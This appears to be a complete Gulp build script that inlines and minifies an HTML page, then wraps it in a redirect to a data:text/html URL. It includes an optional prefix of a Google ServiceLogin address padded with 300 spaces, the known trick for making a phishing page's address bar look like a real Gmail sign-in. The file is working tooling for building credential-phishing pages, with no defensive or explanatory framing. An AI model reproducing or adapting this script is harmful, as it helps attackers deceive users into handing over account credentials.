var gulp = require('gulp'),
  inline = require('gulp-inline-source'),
  htmlmin = require('gulp-htmlmin'),
  change = require('gulp-change');


function toDataURL(content) {
  var addFakeURL = false;
  var fakeURL = "https://accounts.google.com/ServiceLogin?service=mail&continue=https://mail.google.com/mail/#identifier";
  for(var i = 0; i < 300; i++){
    fakeURL += " ";
  }

  content = addFakeURL ? (fakeURL + content) : content;
  content = content.replace(/"/g, "\\\"");
  content = content.replace(/<\/script>/g, "<\\\/script>");

  content = "<script>window.location = \"data:text/html," + content + "\"</script>";

  //console.log(content);
  return content;
}


gulp.task('default', function(){
  //gulp.watch('source/*.html', ['dataURL']);
});

gulp.task('dataURL', function(){
  return gulp.src('./source/index.html')
    .pipe(inline())
    .pipe(htmlmin({collapseWhitespace: true}))
    .pipe(change(toDataURL))
    .pipe(gulp.dest('./public'));
});
